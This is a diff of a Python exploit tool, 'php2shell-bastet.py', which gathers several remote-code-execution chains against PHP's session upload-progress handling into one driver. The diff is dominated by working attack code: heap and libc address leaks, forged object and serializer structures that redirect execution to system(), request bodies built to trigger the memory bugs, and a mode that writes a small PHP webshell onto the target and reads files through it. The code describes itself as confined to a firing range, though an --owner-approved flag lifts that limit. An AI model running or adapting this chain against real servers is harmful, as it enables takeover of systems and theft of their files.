@@ -1,6 +1,30 @@
 #!/usr/bin/env python3
-"""php2shell-bastet.py - range-native exploit research driver for
-CVE-2026-109618/619 (PHP session.upload_progress stale-pointer chain).
+"""php2shell-bastet.py - THE RCE TOOL of the firing range (refactor
+2026-10-24, Dean directive: "move all rce functionality to the php2shell
+and simplify the bleed script to just bleed. Borrow what you must").
+
+ROUTES (ordered; --route dispatch|serializer|groom, dispatch default for
+new-style mode invocations):
+  dispatch   the var_hash-UAF forged-dispatch chain moved verbatim from
+             phpbleed-bastet.py (R-1..R-7; proven on :8088/:8097; re-earned
+             on :8088 at refactor time - see lanes/refactor/notes.md).
+             Leak bootstrap IMPORTS phpbleed-bastet.py as a module (the
+             bleed IS the leak-first bootstrap; no duplication).
+  serializer va-borrowed design (Percivalll audit, lanes/vendor-audit/
+             recon.md - DESIGN ONLY, no vendor code executed): fake
+             ps_serializer entry, decode=zif_system. EXPERIMENTAL: needs
+             --bias (libphp base) + per-build offsets; --dry only unless
+             --i-know-this-is-experimental is passed (no verified target
+             yet; PS(serializer) field offset must be derived per build).
+  groom      the CVE-2026-109618/619 two-update groom path (previous
+             default behavior of this file, kept working; still needs
+             per-target heap tuning - see TODO.md).
+
+MODES: probe (leak bootstrap check) / rce / shell / id / canary
+       (+ legacy single-positional invocation = groom route, unchanged,
+        for back-compat with existing lane tooling).
+The one-exploit-stream-per-target flock is SHARED with phpbleed-bastet
+(same netloc-keyed lock file): the rule now holds ACROSS both tools.
 
 RULES OF ENGAGEMENT (hard):
   * 127.0.0.1/loopback targets ONLY unless --owner-approved is passed,
@@ -23,17 +47,27 @@ Hardening lineage (research/shared/findings.md "live-fire verdict"):
   5. TIMELINE: every stage timestamped; stall-phase misses localise tuning
      failures fastest.
 
-Mechanism (public since php-up-2026 + corroborated by our own source audit):
+Groom-route mechanism (public since php-up-2026 + corroborated by our own
+source audit):
   multipart POST with PHPSESSID + PHP_SESSION_UPLOAD_PROGRESS fields;
   FILLUNIT(5120) stall keeps the progress bucket alive across two
   php_session_rfc1867_update() calls; the second update dtors the previous
   progress tree (HashTable.pDestructor = zval_ptr_dtor); packed t[] array
   reclaims the freed 320-byte bins with a forged zend_fcall_info; the stale
   FILE_DATA store then invokes the forged handler -> system(cmd).
+
+Serializer-route mechanism (va recon, PHP 8.2/8.3 mod_php, per our rung-4
+anchors on the 8.2.34 x86 build):
+  arm leaves BG(unserialize).data = H (chosen by reclaim); R1's var_push
+  wrap-write plants PS(serializer) = H+0x310 (fake name/encode/decode,
+  decode = zif_system); R2's ps_read consumes a session file whose head is
+  a fake zend_execute_data; php_session_decode calls the fake
+  serializer->decode -> zif_system(frame) -> system(cmd).
 """
 from __future__ import annotations
 
 import argparse
+import importlib.util
 import ipaddress
 import json
 import os
@@ -47,22 +81,35 @@ from urllib.parse import urlparse
 
 BOUNDARY = b"K9bastetPoC"
 ORACLE_MARK = "BASTET_PWNED_MARK"
+REPO = os.path.dirname(os.path.abspath(__file__))
 
 BANNER = r"""
       \ /
      ( * )
-      \|/
- /\___/\  |
-(  o o  ) |          php2shell-bastet
-(  =^=  ) |          range-native CVE-2026-10961x driver
- (  "  )  |          the canary sings only for the cat
-____/\_____/__|__    who earns FLAG{...}
+      \|/                  php2shell-bastet
+ /\___/\  |          THE RCE TOOL (phpbleed just bleeds)
+(  o o  ) |          routes: dispatch | serializer | groom
+(  =^=  ) |          the canary sings only for the cat
+ (  "  )  |          who earns FLAG{...}
+____/\_____/__|__
 """
 
-# ---------------------------------------------------------------- profiles --
-# FILL=5120 is FILLUNIT (main/rfc1867.c). Groom bin size 320 = align(24+288+1)
-# matches the progress HashTable (nTableSize 8 => HT 320). Forge offsets are
-# x86-64 gcc struct packing for zend_fcall_info / zend_internal_function.
+
+def _load_phpbleed():
+    """Import phpbleed-bastet.py (hyphenated filename -> importlib)."""
+    spec = importlib.util.spec_from_file_location(
+        "phpbleed_bastet", os.path.join(REPO, "phpbleed-bastet.py"))
+    m = importlib.util.module_from_spec(spec)
+    spec.loader.exec_module(m)
+    return m
+
+
+def log(stage: str, msg: str, t0: float) -> None:
+    print(f"[{time.time() - t0:6.1f}s] {stage:9s} {msg}", flush=True)
+
+
+# ============================================================ groom route ==
+# (previous default behavior of this file, unchanged logic)
 PROFILES = {
     "x86_64-php8x": {
         "arch": "x86_64", "fill": 5120, "n_groom": 149, "blob": 288,
@@ -72,13 +119,6 @@ PROFILES = {
         "zend_internal": 1, "is_string": 0x106, "is_object": 0x308,
         "off_cmd": 200, "cmd_room": 80,
     },
-    # Derived from THIS build's headers via offsetof probe (see
-    # scripts/derive_offsets.py): FCI{size@0 fn.val@8 type@16 params@32
-    # param_count@48, size 64}; zend_internal_function{type@0 handler@72,
-    # size 136}. Handler delta is 72 on aarch64 vs 88 on x86 - this is the
-    # porting trap the leaked x86 profile would have walked straight into.
-    # Bin-groom count (149) stays empirical per allocator build: jitter
-    # sweep handles it; FILL=5120 is arch-independent (FILLUNIT).
     "aarch64-php8x": {
         "arch": "aarch64", "fill": 5120, "n_groom": 149, "blob": 288,
         "fci_size": 64, "off_fn": 8, "off_type": 16, "off_params": 32,
@@ -90,11 +130,6 @@ PROFILES = {
 }
 
 
-def log(stage: str, msg: str, t0: float) -> None:
-    print(f"[{time.time() - t0:6.1f}s] {stage:9s} {msg}", flush=True)
-
-
-# ------------------------------------------------------------------- leak --
 def leak_bias(leak_url: str, t0: float) -> int:
     """Full fingerprint leak via lab oracle (?probe=all): arch, php version,
     SAPI, module biases, heap span. Hard-gates the profile against reality -
@@ -126,7 +161,6 @@ def resolve_call(syms_path: str, bias: int, t0: float) -> int:
     return call
 
 
-# ------------------------------------------------------------------ forge --
 def forge(prof: dict, call: int, cmd: bytes) -> bytes:
     """One 320-bin payload doubling as reclaimed packed-array zval and as
     a forged zend_fcall_info whose handler pointer is the leaked target."""
@@ -169,7 +203,6 @@ def build_body(prof: dict, sid: str, cmd: bytes, call: int,
     return phase1, tail
 
 
-# --------------------------------------------------------------- deliver --
 def deliver(url: str, phase1: bytes, tail: bytes, sid: str, stall: float,
             timeout: int = 40) -> bytes:
     """Plain-HTTP two-chunk delivery. (No TLS relay: the range speaks HTTP on
@@ -212,6 +245,368 @@ def verify_blind(verify_url: str) -> bool:
         return False
 
 
+# ========================================================= dispatch route ==
+# Moved verbatim from phpbleed-bastet.py 2026-10-24 (map.md binding): the
+# var_hash-UAF forged-dispatch chain. Leak primitives are IMPORTED from the
+# phpbleed module (bleeder); phpbleed_chain.py stays the shared reader.
+
+PB = None          # loaded phpbleed_bastet module (set in main)
+
+
+def _wire_chain(t):
+    """phpbleed_chain read hook -> phpbleed transport (same as before)."""
+    import phpbleed_chain as chain
+    chain.isstring_read = lambda addr, timeout=5: PB.read_at(t, addr, timeout)
+    return chain
+
+
+def dispatch_fire_cmd(t, ce_stdclass, system_addr, spray_addr, cmd14):
+    """R-7 (moved verbatim): single <=14B system() via forged dispatch."""
+    assert len(cmd14) <= 14
+    cmd = b"\x09" + cmd14
+    spray = bytearray(PB.SPRAY_LEN)
+    fake_obj = spray_addr + 104
+    struct.pack_into("<Q", spray, 40, fake_obj)
+    struct.pack_into("<I", spray, 48, 0x08)
+    spray[104:104 + len(cmd)] = cmd
+    spray[104 + len(cmd)] = 0
+    struct.pack_into("<Q", spray, 120, ce_stdclass)
+    struct.pack_into("<Q", spray, 128, spray_addr)
+    struct.pack_into("<Q", spray, 136, 1)
+    struct.pack_into("<Q", spray, 200, system_addr)
+    out = t.send(PB._spray_with(bytes(spray), 1, PB.REF_BASE))
+    return out
+
+
+def _dispatch_common(t, args):
+    """R-1..R-5 shared by rce/shell/id modes. Returns (chain, libphp, eg,
+    system_addr, ce, S) or None."""
+    chain = _wire_chain(t)
+    hr = PB.heap_leak(t)
+    if not hr:
+        PB.log("x", "R-1 heap leak failed")
+        return None
+    PB.log("+", f"R-1 LEAKED heap_ref :: 0x{hr:x}")
+    cands = chain.scan_for_elf(hr & ~0x1FFFFF)
+    libphp = eg = pltgot = None
+    for base, phnum in cands:
+        PB.log("~", f"R-3 validating ELF @ 0x{base:x}")
+        try:
+            eg, pltgot = chain.gnu_hash_resolve(
+                base, 'executor_globals', '_GLOBAL_OFFSET_TABLE_')
+        except RuntimeError:
+            continue
+        libphp = base
+        break
+    if not libphp:
+        PB.log("x", "R-3 no libphp among candidates")
+        return None
+    PB.log("+", f"R-3 LIBPHP 0x{libphp:x} EG 0x{eg:x} GOT 0x{pltgot:x}")
+    libc_base = chain.libc_from_got_dump(libphp, pltgot)
+    if libc_base is None:
+        PB.log("x", "R-4 libc not located via GOT dump")
+        return None
+    system_addr = chain.gnu_hash_resolve(libc_base, 'system')
+    PB.log("+", f"R-4 LIBPHP libc 0x{libc_base:x} system 0x{system_addr:x}")
+    ce_stdclass = chain.lookup_class_table(eg, 'stdclass')
+    if ce_stdclass is None:
+        PB.log("x", "R-5 stdClass ce not resolved")
+        return None
+    PB.log("+", f"R-5 stdClass ce :: 0x{ce_stdclass:x}")
+    spray_addr = chain.find_spray_slot(PB.heap_leak(t))  # FRESH leak
+    if spray_addr is None:
+        PB.log("x", "R-6 spray slot not found")
+        return None
+    PB.log("+", f"R-6 spray S :: 0x{spray_addr:x}")
+    return (chain, libphp, eg, system_addr, ce_stdclass, spray_addr)
+
+
+def route_dispatch_rce(t, args) -> int:
+    """Full chain: R-1..R-7, single <=14B cmd (moved mode_rce)."""
+    common = _dispatch_common(t, args)
+    if common is None:
+        return 2
+    _chain, _libphp, _eg, system_addr, ce_stdclass, spray_addr = common
+    cmd = args.cmd.encode("latin-1")
+    if len(cmd) > 14:
+        PB.log("x", "R-7 command exceeds 14 bytes")
+        return 2
+    PB.log(">", f"R-7 firing :: \\n{cmd.decode('latin-1')}")
+    out = dispatch_fire_cmd(t, ce_stdclass, system_addr, spray_addr, cmd)
+    if out is None:
+        PB.log("~", "R-7 no response (executed then crashed?)")
+    else:
+        PB.log("+", f"R-7 response head={out[:160]!r}")
+    PB.log("+", f"CHAIN COMPLETE :: {t.req_count} requests")
+    return 0
+
+
+def route_dispatch_id(t, args) -> int:
+    """id mode (moved): legacy single-shot with --ce/--system/--spray,
+    else full self-deriving chain."""
+    if args.ce and args.system and args.spray:
+        cmd = args.cmd.encode("latin-1")
+        if len(cmd) > 14:
+            PB.log("x", f"command {cmd!r} exceeds 14 bytes (vendor single-shot)")
+            return 2
+        out = dispatch_fire_cmd(t, args.ce, args.system, args.spray, cmd)
+        if out is None:
+            PB.log("~", "no response (worker may have executed then crashed)")
+        else:
+            PB.log("+", f"EXECUTED stage fired; resp head={out[:120]!r}")
+        return 0
+    return route_dispatch_rce(t, args)
+
+
+def _split_for_echo(content, staging='w'):
+    """Vendor ported (moved verbatim): <=14B `echo -n ...>>w` cmds."""
+    special = set('<>?$`[](){};&|!*#~"\'\\ \t\n')
+    overhead = len(f'echo -n >>{staging}')
+    cmds, i = [], 0
+    while i < len(content):
+        budget = 14 - overhead
+        chunk = ''
+        if content[i] in special:
+            chunk = '\\' + content[i]
+            i += 1
+            budget -= 2
+        while budget > 0 and i < len(content) and content[i] not in special:
+            chunk += content[i]
+            i += 1
+            budget -= 1
+        cmd = f'echo -n {chunk}>>{staging}'
+        assert len(cmd) <= 14, f"BUG: {cmd!r} is {len(cmd)} bytes"
+        cmds.append(cmd)
+    return cmds
+
+
+WEBSHELL_BODY = '<?=readfile($_GET[1])?>'
+
+
+def route_dispatch_shell(t, args) -> int:
+    """shell mode (moved): full chain + staged webshell + fetch --fetch."""
+    common = _dispatch_common(t, args)
+    if common is None:
+        return 2
+    _chain, _libphp, _eg, system_addr, ce, S = common
+    PB.log("+", f"R-5/6 ce 0x{ce:x} S 0x{S:x}")
+    fname = args.webshell
+    rename = f'mv w {fname}'
+    assert len(rename) <= 14
+    cmds = ['rm -f w'] + _split_for_echo(WEBSHELL_BODY) + [rename]
+    PB.log(">", f"R-7 staging webshell {fname!r} via {len(cmds)} triggers")
+    for i, c in enumerate(cmds, 1):
+        dispatch_fire_cmd(t, ce, system_addr, S, c.encode('latin-1'))
+        if i % 5 == 0 or i == len(cmds):
+            PB.log("~", f"stage {i}/{len(cmds)} ({t.req_count} reqs)")
+    body = t.get(f"/{fname}", f"?1={args.fetch}")
+    if body and (b"FLAG{" in body or len(body) > 0):
+        PB.log("+", f"SHELL LIVE :: /{fname}")
+        PB.log("+", f"FETCH {args.fetch} -> {body[:200]!r}")
+        if b"FLAG{" in body:
+            import re
+            m = re.search(rb"FLAG\{[^}]+\}", body)
+            PB.log("+", f"CANARY CAPTURED :: {m.group(0).decode()}")
+        return 0
+    PB.log("x", "webshell not reachable")
+    return 2
+
+
+def route_dispatch_canary(t, args) -> int:
+    """canary mode (moved): needs a write-back channel or RCE; falls back
+    to shell mode (staged webshell readfile channel) by default."""
+    PB.log("i", "canary: dispatching to shell route (webshell readfile)")
+    return route_dispatch_shell(t, args)
+
+
+def route_dispatch_probe(t, args) -> int:
+    """probe mode (moved): leak bootstrap check - heap leak + ELF scan +
+    executor_globals resolution. Engine-independent (any route)."""
+    hr = args.addr if args.addr else PB.heap_leak(t)
+    if not hr:
+        PB.log("x", "no heap leak")
+        return 2
+    if not args.addr:
+        PB.log("+", f"LEAKED heap_ref :: 0x{hr:x}")
+    chain = _wire_chain(t)
+    chunk = hr & ~0x1FFFFF
+    cands = chain.scan_for_elf(chunk)
+    libphp = eg = pltgot = None
+    for base, phnum in cands:
+        PB.log("~", f"validating ELF @ 0x{base:x} phnum={phnum}")
+        try:
+            eg, pltgot = chain.gnu_hash_resolve(
+                base, 'executor_globals', '_GLOBAL_OFFSET_TABLE_')
+        except RuntimeError as e:
+            PB.log("-", f"0x{base:x}: {e}")
+            continue
+        libphp = base
+        break
+    if libphp:
+        PB.log("+", f"LIBPHP :: base 0x{libphp:x}")
+        PB.log("+", f"executor_globals :: 0x{eg:x} (off 0x{eg-libphp:x})")
+        PB.log("+", f"PLTGOT :: 0x{pltgot:x}")
+    else:
+        PB.log("-", "no ELF candidate exports executor_globals")
+    return 0 if libphp else 1
+
+
+# ====================================================== serializer route ==
+# va-borrowed DESIGN (Percivalll audit lanes/vendor-audit/recon.md; their
+# code NEVER executed - standing rule). Our 8.2.34 x86 anchors (rung 4):
+#   ps_globals  = libphp + 0xF0C998   (.bss, writable, readelf-verified)
+#   zif_system  = libphp + 0x36FF48   (readelf-verified)
+#   PS(serializer) field offset within ps_globals: NOT yet derived for
+#   8.2.34 (va's +0x148 is their 8.3.35 measurement) -> REQUIRED flag
+#   --ps-serializer-off until derived (TODO VA #3).
+# EXPERIMENTAL: no verified target; fires only with
+# --i-know-this-is-experimental, else --dry builds the bodies.
+
+VA_BND = b"V" * 10
+
+
+def va_part(name: bytes, data: bytes = b"", filename: bytes | None = None) -> bytes:
+    out = bytearray()
+    out += b"--" + VA_BND + b'\r\nContent-Disposition: form-data; name="' + name + b'"'
+    if filename is not None:
+        out += b'; filename="' + filename + b'"\r\nContent-Type: application/octet-stream'
+    out += b"\r\n\r\n" + data + b"\r\n"
+    return bytes(out)
+
+
+def va_send(host: str, port: int, body: bytes, sid: str, timeout: int = 300) -> bytes:
+    """Chunked-TE multipart POST (va design: no Content-Length ->
+    rfc1867 skips the post_max_size check)."""
+    hdr = (("POST / HTTP/1.1\r\nHost: %s:%d\r\nCookie: PHPSESSID=%s\r\n"
+            "Content-Type: multipart/form-data; boundary=%s\r\n"
+            "Transfer-Encoding: chunked\r\nConnection: close\r\n\r\n") %
+           (host, port, sid, VA_BND.decode())).encode()
+    s = socket.create_connection((host, port), timeout=timeout)
+    s.settimeout(timeout)
+    s.sendall(hdr)
+    for i in range(0, len(body), 65536):
+        piece = body[i:i + 65536]
+        s.sendall(("%x\r\n" % len(piece)).encode() + piece + b"\r\n")
+    s.sendall(b"0\r\n\r\n")
+    data = bytearray()
+    while True:
+        try:
+            c = s.recv(65536)
+        except OSError:
+            break
+        if not c:
+            break
+        data += c
+    s.close()
+    return bytes(data)
+
+
+def va_fake_r1(H: int, psg_serializer_addr: int, zif: int) -> bytes:
+    """Fake php_unserialize_data + var_entries + fake ps_serializer (va
+    design, offsets per their stage_rce.py but with OUR anchors)."""
+    b = bytearray(0x2017)
+    struct.pack_into("<Q", b, 0x00, H + 0x200)      # var_entries last
+    struct.pack_into("<Q", b, 0x10, H + 0x300)      # last_dtor
+    struct.pack_into("<q", b, 0x30, 1000)          # max_depth
+    N0 = (psg_serializer_addr - (H + 0x200) - 0x10) // 8   # 64-bit wrap
+    struct.pack_into("<q", b, 0x200, N0)           # var_entries used_slots
+    struct.pack_into("<q", b, 0x300, 0)            # dtor used_slots
+    struct.pack_into("<Q", b, 0x310, 0)            # fake serializer name
+    struct.pack_into("<Q", b, 0x318, 0)            # encode
+    struct.pack_into("<Q", b, 0x320, zif)          # decode = zif_system
+    return bytes(b)
+
+
+def va_fake_r2(H: int, psg_serializer_addr: int, zif: int, cmd: bytes,
+               str_off: int = 0x400) -> bytes:
+    b = bytearray(va_fake_r1(H, psg_serializer_addr, zif))
+    struct.pack_into("<Q", b, str_off, 1 | (0x106 << 32))   # gc, IS_STRING_EX
+    struct.pack_into("<q", b, str_off + 0x10, len(cmd))     # len
+    b[str_off + 0x18:str_off + 0x18 + len(cmd)] = cmd       # data
+    b[str_off + 0x18 + len(cmd)] = 0
+    return bytes(b)
+
+
+def va_frame_key(H: int, str_off: int = 0x400) -> bytes:
+    """0x4000B PHP_SESSION_UPLOAD_PROGRESS key = fake zend_execute_data
+    (arg1 -> fake zend_string at H+str_off). ASLR 0x7c gate applies (va
+    rung 6): key must not contain the session delimiter '|'."""
+    key = bytearray(b"A" * 0x4000)
+    for i in range(0, 0x60, 8):
+        struct.pack_into("<Q", key, i, 0)
+    struct.pack_into("<I", key, 0x2C - 0x10, 1)               # num_args
+    struct.pack_into("<Q", key, 0x50 - 0x10, H + str_off)     # arg1 value
+    struct.pack_into("<I", key, 0x58 - 0x10, 6)               # arg1 IS_STRING
+    if b"|" in key:
+        raise SystemExit("key contains |: unfavorable ASLR (va rung 6 gate)")
+    return bytes(key)
+
+
+def route_serializer(t, args, u) -> int:
+    """EXPERIMENTAL va-borrowed serializer chain (design port, unverified).
+    Stages mirror the va reconstruction: r1big producer -> trig2 frame
+    producer -> r1 wrap-write -> r2 trigger. Requires --bias, --data (H),
+    --ps-serializer-off; --dry builds bodies only."""
+    host, port = u.hostname, u.port or 80
+    bias = args.bias
+    if bias is None:
+        raise SystemExit("serializer route: --bias (libphp base) required "
+                         "(leak-first; use phpbleed probe/dump to obtain it)")
+    if args.ps_serializer_off is None:
+        raise SystemExit("serializer route: --ps-serializer-off required "
+                         "(8.2.34 field offset not yet derived; TODO VA #3)")
+    psg = bias + 0xF0C998          # our 8.2.34 x86 anchor (rung 4)
+    zif = bias + 0x36FF48          # our 8.2.34 x86 anchor (rung 4)
+    psg_serializer = psg + args.ps_serializer_off
+    H = args.data if args.data else 0
+    if not H:
+        raise SystemExit("serializer route: --data H required (BG.data plant "
+                         "address; va arm stage not ported to auto-derive)")
+    cmd = args.command.encode() + b"\\x00"
+    bodies = {}
+    fake_r1 = va_fake_r1(H, psg_serializer, zif)
+    fake_r2 = va_fake_r2(H, psg_serializer, zif, cmd, args.str_off)
+    key = va_frame_key(H, args.str_off)
+    bodies["r1"] = (va_part(b"PHPSESSID", b"r1big") +
+                    va_part(b"PHP_SESSION_UPLOAD_PROGRESS", b"pwn") +
+                    va_part(b"big", b"B" * (38 << 20)) +
+                    b"".join(va_part(b"f%03d" % i, fake_r1) for i in range(64)) +
+                    va_part(b"f", b"X" * 8, filename=b"a.txt") +
+                    b"--" + VA_BND + b"--\r\n")
+    bodies["r2"] = (va_part(b"PHPSESSID", b"trig2") +
+                    va_part(b"PHP_SESSION_UPLOAD_PROGRESS", b"pwn") +
+                    b"".join(va_part(b"g%03d" % i, fake_r2) for i in range(900)) +
+                    va_part(b"f", b"X" * 8, filename=b"a.txt") +
+                    b"--" + VA_BND + b"--\r\n")
+    bodies["frame"] = (va_part(b"PHPSESSID", b"trig2") +
+                       va_part(b"PHP_SESSION_UPLOAD_PROGRESS", key) +
+                       va_part(b"f", b"X" * 8, filename=b"a.txt") +
+                       va_part(b"big", b"B" * (120 << 20)) +
+                       b"--" + VA_BND + b"--\r\n")
+    if args.out:
+        for name, body in bodies.items():
+            open(f"{args.out}.{name}", "wb").write(body)
+        print(f"serializer: --dry wrote {list(bodies)} to {args.out}.*")
+    if args.dry:
+        print("serializer: dry run complete (bodies built; nothing sent)")
+        return 0
+    if not args.experimental_ok:
+        raise SystemExit("serializer route is EXPERIMENTAL (no verified "
+                         "target; va design port only). Pass "
+                         "--i-know-this-is-experimental to fire.")
+    log("SER", f"r1 -> http://{host}:{port} (psg_serializer=0x{psg_serializer:x})", time.time())
+    r = va_send(host, port, bodies["r1"], "r1big")
+    print("r1 status", r.split(b"\r\n", 1)[0][:60] if r else "(no response)")
+    log("SER", "frame -> trig2", time.time())
+    r = va_send(host, port, bodies["frame"], "trig2")
+    print("frame status", r.split(b"\r\n", 1)[0][:60] if r else "(no response)")
+    log("SER", "r2 -> trig2", time.time())
+    r = va_send(host, port, bodies["r2"], "trig2")
+    print("r2 status", r.split(b"\r\n", 1)[0][:60] if r else "(no response)")
+    PB.log("i", "serializer route fired (experimental; verify via proof file")
+    return 0
+
+
 # ---------------------------------------------------------------- safety --
 def guard_target(url: str, owner_approved: bool) -> None:
     if owner_approved:
@@ -232,33 +627,11 @@ def guard_target(url: str, owner_approved: bool) -> None:
 
 
 # ------------------------------------------------------------------- main --
-def main() -> int:
-    ap = argparse.ArgumentParser(description="php2shell-bastet (firing-range only)")
-    ap.add_argument("target", help="http://127.0.0.1:PORT/lab.php")
-    ap.add_argument("--command", default=f"id; echo {ORACLE_MARK}")
-    ap.add_argument("--profile", default="x86_64-php8x")
-    ap.add_argument("--syms", required=False,
-                    help='JSON {"zend_call_function": "0xOFF"} from nm of the target binary')
-    ap.add_argument("--bias", type=lambda x: int(x, 16), default=None,
-                    help="leaked libphp base (for targets without the "
-                         "lab oracle; leak-first applies - bias comes from "
-                         "an in-band leak or the assisted range helper)")
-    ap.add_argument("--leak-url", default="", help="lab oracle URL (default: target)")
-    ap.add_argument("--attempts", type=int, default=8)
-    ap.add_argument("--stall", type=float, default=1.4)
-    ap.add_argument("--jitter", type=int, default=6,
-                    help="groom-count sweep +/- N across attempts")
-    ap.add_argument("--progress-len", type=int, default=0,
-                    help="PHP_SESSION_UPLOAD_PROGRESS value size (OOM trigger; "
-                         "e.g. 1048576 at 2M limit = vendor's FORMDATA-copy OOM)")
-    ap.add_argument("--verify-url", default="", help="blind file-drop check URL")
-    ap.add_argument("--out", default="", help="with --dry: write full body to file")
-    ap.add_argument("--dry", action="store_true", help="build body only, never send")
-    ap.add_argument("--owner-approved", action="store_true")
-    a = ap.parse_args()
+MODES = ("probe", "rce", "shell", "id", "canary")
 
-    guard_target(a.target, a.owner_approved)
-    print(BANNER, flush=True)
+
+def groom_main(a) -> int:
+    """Legacy groom-route flow (previous main() of this file, verbatim)."""
     prof = PROFILES.get(a.profile)
     if not prof:
         raise SystemExit(f"profile {a.profile!r} unknown; aarch64 profiles "
@@ -312,6 +685,113 @@ def main() -> int:
             return 0
     log("CHAIN", "FAILED - retune profile; see findings.md groom notes", t0)
     return 1
+
+
+def main() -> int:
+    ap = argparse.ArgumentParser(
+        description="php2shell-bastet - THE RCE TOOL (dispatch|serializer|"
+                    "groom; phpbleed-bastet.py is bleeder-only)")
+    ap.add_argument("pos1", nargs="?", help="mode (%s) or target URL "
+                   "(legacy groom invocation)" % "|".join(MODES))
+    ap.add_argument("pos2", nargs="?", help="target URL (new-style mode "
+                   "invocation)")
+    ap.add_argument("--route", choices=("dispatch", "serializer", "groom"),
+                    default="dispatch",
+                    help="RCE engine (default dispatch; legacy single-"
+                         "positional invocation implies groom)")
+    ap.add_argument("--command", default=f"id; echo {ORACLE_MARK}",
+                    help="groom route: full command; dispatch route: "
+                         "<=14B system() command")
+    ap.add_argument("--profile", default="x86_64-php8x", help="groom route")
+    ap.add_argument("--syms", required=False,
+                    help='groom route: JSON {"zend_call_function": "0xOFF"}')
+    ap.add_argument("--bias", type=lambda x: int(x, 16), default=None,
+                    help="leaked libphp base (groom: leak-url alt; "
+                         "serializer: REQUIRED)")
+    ap.add_argument("--leak-url", default="", help="groom route")
+    ap.add_argument("--attempts", type=int, default=8, help="groom route")
+    ap.add_argument("--stall", type=float, default=1.4, help="groom route")
+    ap.add_argument("--jitter", type=int, default=6, help="groom route")
+    ap.add_argument("--progress-len", type=int, default=0, help="groom route")
+    ap.add_argument("--verify-url", default="", help="groom route")
+    ap.add_argument("--out", default="", help="--dry body output path")
+    ap.add_argument("--dry", action="store_true", help="build only, never send")
+    ap.add_argument("--owner-approved", action="store_true")
+    # dispatch-route modes (moved CLI surface from phpbleed-bastet.py)
+    ap.add_argument("--field", default="cook",
+                    help="dispatch: POST field carrying the payload")
+    ap.add_argument("--class", dest="klass", default="CachedData",
+                    help="dispatch: Serializable gadget class name")
+    ap.add_argument("--cmd", default=None,
+                    help="dispatch: <=14B command (default --command trimmed)")
+    ap.add_argument("--addr", type=lambda x: int(x, 16), default=None,
+                    help="dispatch probe: start from known heap ref")
+    ap.add_argument("--ce", type=lambda x: int(x, 16), default=None,
+                    help="dispatch id: stdClass ce addr (legacy single-shot)")
+    ap.add_argument("--system", type=lambda x: int(x, 16), default=None,
+                    help="dispatch id: libc system() addr (legacy)")
+    ap.add_argument("--spray", type=lambda x: int(x, 16), default=None,
+                    help="dispatch id: spray slot S (legacy)")
+    ap.add_argument("--webshell", default="r.php",
+                    help="dispatch shell: staged webshell filename")
+    ap.add_argument("--fetch", default="/CANARY",
+                    help="dispatch shell: path read back through the shell")
+    # serializer-route flags (EXPERIMENTAL)
+    ap.add_argument("--ps-serializer-off", type=lambda x: int(x, 0), default=None,
+                    help="serializer: PS(serializer) field offset in ps_globals "
+                         "(8.2.34 not yet derived; TODO VA #3)")
+    ap.add_argument("--data", type=lambda x: int(x, 0), default=None,
+                    help="serializer: H = planted BG.data address")
+    ap.add_argument("--str-off", type=lambda x: int(x, 0), default=0x400,
+                    help="serializer: fake zend_string offset from H")
+    ap.add_argument("--i-know-this-is-experimental", dest="experimental_ok",
+                    action="store_true",
+                    help="serializer: allow firing (route is unverified)")
+    a = ap.parse_args()
+
+    # --- argument shape resolution (map.md binding):
+    # new-style: pos1 = mode word -> route defaults to dispatch (unless
+    # --route given); legacy: pos1 = URL, pos2 empty -> groom route.
+    mode = None
+    target = None
+    if a.pos1 in MODES:
+        mode = a.pos1
+        target = a.pos2
+    else:
+        target = a.pos1
+        a.route = "groom"       # legacy invocation = previous behavior
+    if not target:
+        raise SystemExit("target URL required")
+    if mode and a.route == "groom" and mode != "rce":
+        raise SystemExit("groom route supports mode rce only")
+    if a.cmd is None:
+        a.cmd = a.command[:14] if a.route == "dispatch" else a.command
+
+    guard_target(target, a.owner_approved)
+
+    global PB
+    PB = _load_phpbleed()
+    print(BANNER, flush=True)
+    # cross-tool one-stream-per-target flock (same netloc-keyed lock as
+    # phpbleed-bastet.py; the rule now holds ACROSS both tools)
+    PB.acquire_target_lock(target)
+
+    if a.route == "groom":
+        return groom_main(a)
+
+    u = urlparse(target if "://" in target else "http://" + target)
+    if a.route == "serializer":
+        return route_serializer(None, a, u)
+
+    # dispatch route (default): leak-first bootstrap via the phpbleed module
+    t = PB.Target(target, field=a.field)
+    PB._CLASS = a.klass
+    PB.log(">", f"dispatch target :: http://{t.host}:{t.port}{t.path} "
+                f"(leak bootstrap: phpbleed module)")
+    fn = {"probe": route_dispatch_probe, "rce": route_dispatch_rce,
+          "id": route_dispatch_id, "shell": route_dispatch_shell,
+          "canary": route_dispatch_canary}[mode or "rce"]
+    return fn(t, a)
 
 
 if __name__ == "__main__":
